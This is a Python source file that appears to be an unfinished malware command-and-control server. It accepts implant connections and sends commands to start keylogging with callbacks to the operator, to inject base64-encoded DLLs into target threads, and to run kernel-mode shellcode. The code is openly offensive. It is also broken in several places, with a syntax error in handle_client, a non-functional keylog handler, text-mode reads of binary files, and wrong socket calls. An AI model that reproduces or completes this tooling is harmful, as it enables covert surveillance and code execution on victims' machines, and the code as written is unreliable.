
import threading
import base64
import socket

KEYLOGGING_PORT = 5000
KEYLOGGING_QUERY_INTERVAL = 1
KEYLOGGING_LOG_FILE = "keylog.txt"

SHOULD_KEYLOG = False

def handle_keylogging(sock, logfile: str):
    while True:
        with open(logfile, "a+") as file:
          conn, _ = sock.accept()

        


def start_keylogging(conn: socket.socket, ip: str, port: int = KEYLOGGING_PORT, query_interval: int = KEYLOGGING_QUERY_INTERVAL,
                     logfile: str = KEYLOGGING_LOG_FILE):
    request = f"start_keylogging\n{ip}\n{port}\n{query_interval}"
    sock = socket.socket()
    sock.bind(("0.0.0.0", port))
    sock.listen()
    conn.send(request)
    keylog_sock, _ = conn.accept()


def inject_dll_to_thread(conn: socket.socket, tid: int, dll_path: str):
    base64_contents = ""
    with open(dll_path, "r") as dll:
        base64_contents = base64.b64encode(dll.read()).decode()
    conn.send(f"inject_lib\n{tid}\b{base64_contents}")

def run_km_shellcode(conn: socket.socket, shellcode_path: str, input: bytes):
    base64_contents = ""
    with open(shellcode_path, "r") as shellcode:
        base64_contents = base64.b64encode(shellcode.read()).decode()
    conn.send(f"run_km\n{base64.b64encode(input).decode()}\n{base64_contents}")

def handle_client(conn: socket.socket):
    while True:
        command = input("Command: ")
        if command == ""

def main():
    print("Start attacking and stuff")
    with socket.socket() as server, socket.socket() as keylogging_socket:
        server.bind("0.0.0.0", 9191)
        server.listen(1)
        
        while True:
            conn, addr = server.accept()
            print(f"{addr} connected to server")
            handle_client(conn)

if __name__ == "__main__":
    main()
